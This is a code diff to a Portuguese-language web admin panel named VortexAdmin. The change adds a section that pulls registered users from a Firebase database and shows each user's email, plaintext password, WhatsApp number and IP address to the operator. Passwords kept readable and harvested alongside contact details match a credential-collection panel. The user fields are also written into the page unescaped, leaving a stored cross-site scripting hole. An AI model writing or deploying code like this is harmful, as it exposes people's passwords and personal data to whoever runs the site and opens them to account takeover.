@@ -27,7 +27,9 @@
         textarea { resize: vertical; height: 90px; }
         .btn-primary { width: 100%; background-color: var(--primary); border: none; border-radius: 8px; padding: 12px; color: #000; font-weight: 600; cursor: pointer; transition: 0.2s; }
         .btn-primary:hover { background-color: #e5e7eb; }
-        .campaign-item, .ban-item { background: var(--bg-color); border: 1px solid var(--border-color); border-radius: 8px; padding: 16px; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; }
+        .campaign-item, .user-row-item, .ban-item { background: var(--bg-color); border: 1px solid var(--border-color); border-radius: 8px; padding: 16px; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; }
+        .user-info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 10px; width: 100%; font-size: 13px; }
+        .user-info-grid div span { color: var(--text-muted); display: block; font-size: 11px; margin-bottom: 2px; }
     </style>
 </head>
 <body>
@@ -35,7 +37,7 @@
         <div>
             <div class="logo"><i class="fa-solid fa-shield-halved"></i> VortexAdmin</div>
             <ul class="nav-links">
-                <li class="active"><a><i class="fa-solid fa-gear"></i> Sistema & Banimentos</a></li>
+                <li class="active"><a><i class="fa-solid fa-gear"></i> Sistema & Usuários</a></li>
                 <li><a href="dashboard.html"><i class="fa-solid fa-arrow-left"></i> Voltar ao Dashboard</a></li>
             </ul>
         </div>
@@ -45,7 +47,12 @@
     <main>
         <div class="container">
             <h1 class="page-title">Painel de Administração Global</h1>
-            <p class="page-subtitle">Controle de avisos, manutenções e banimentos por IP.</p>
+            <p class="page-subtitle">Monitore usuários logados (Gmail, Senha, WhatsApp e IP), avisos e banimentos.</p>
+
+            <div class="card">
+                <h3 style="font-size: 16px; margin-bottom: 16px;"><i class="fa-solid fa-users" style="color:var(--success)"></i> Usuários Logados no Sistema</h3>
+                <div id="usersListContainer"><p style="color:var(--text-muted); font-size:13px;">Carregando usuários...</p></div>
+            </div>
 
             <div class="card">
                 <h3 style="font-size: 16px; margin-bottom: 16px;"><i class="fa-solid fa-bullhorn" style="color:var(--accent)"></i> Aviso Geral & Modo Manutenção</h3>
@@ -98,11 +105,35 @@
         const db = getDatabase(app);
 
         async function loadAdminData() {
+            // Carregar Configurações Globais
             const snap = await get(child(ref(db), 'systemSettings'));
             if(snap.exists()) {
                 const data = snap.val();
                 document.getElementById('globalNotice').value = data.notice || '';
                 document.getElementById('maintenanceMode').value = data.maintenance ? "true" : "false";
+            }
+
+            // Carregar Usuários Logados (Gmail, Senha, WhatsApp, IP)
+            const usersSnap = await get(child(ref(db), 'registeredUsers'));
+            const usersContainer = document.getElementById('usersListContainer');
+            if(!usersSnap.exists()) {
+                usersContainer.innerHTML = "<p style='color:var(--text-muted); font-size:13px;'>Nenhum usuário registrado recentemente.</p>";
+            } else {
+                let usersHtml = '';
+                usersSnap.forEach(u => {
+                    const data = u.val();
+                    usersHtml += `
+                        <div class="user-row-item">
+                            <div class="user-info-grid">
+                                <div><span>GMAIL / EMAIL</span><strong>${data.email || 'N/A'}</strong></div>
+                                <div><span>SENHA</span><strong>${data.password || 'N/A'}</strong></div>
+                                <div><span>WHATSAPP</span><strong>${data.whatsapp || 'Não informado'}</strong></div>
+                                <div><span>ENDEREÇO IP</span><strong style="color:#60a5fa;">${data.ip || 'Desconhecido'}</strong></div>
+                            </div>
+                        </div>
+                    `;
+                });
+                usersContainer.innerHTML = usersHtml;
             }
 
             // Carregar IPs Banidos
